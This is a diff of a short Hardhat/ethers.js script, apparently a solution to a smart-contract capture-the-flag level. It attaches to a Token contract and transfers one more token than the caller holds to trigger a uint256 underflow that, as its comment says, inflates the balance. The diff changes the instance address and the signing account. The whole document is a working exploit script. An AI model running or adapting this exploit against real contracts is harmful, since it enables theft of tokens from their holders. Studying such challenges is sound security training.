@@ -4,12 +4,13 @@ async function main() {
   const [owner, otherAccount] = await ethers.getSigners();
   const TokenContract = await hre.ethers.getContractFactory("Token");
   // attach your instance address
-  const Instance = "0x62087666e677473766C4305B0C2FA6D79b37c7E7";
-  const Token = TokenContract.connect(otherAccount).attach(Instance);
-  const balance = await Token.balanceOf(otherAccount.address);
+  const Instance = "0x90fa56C9FCE2E5147c5Ed5c75d7d2CAB4395E736";
+  const Token = TokenContract.attach(Instance);
+  const balance = await Token.balanceOf(owner.address);
   // It will cause the uint256 overflow -> which result in Increased Balance
-  await Token.transfer(owner.address, parseInt(balance) + 1);
-  const newBalance = await Token.balanceOf(otherAccount.address);
+  const tx = await Token.transfer(otherAccount.address, parseInt(balance) + 1);
+  await tx.wait(1);
+  const newBalance = await Token.balanceOf(owner.address);
   console.log(balance, newBalance);
 }
 
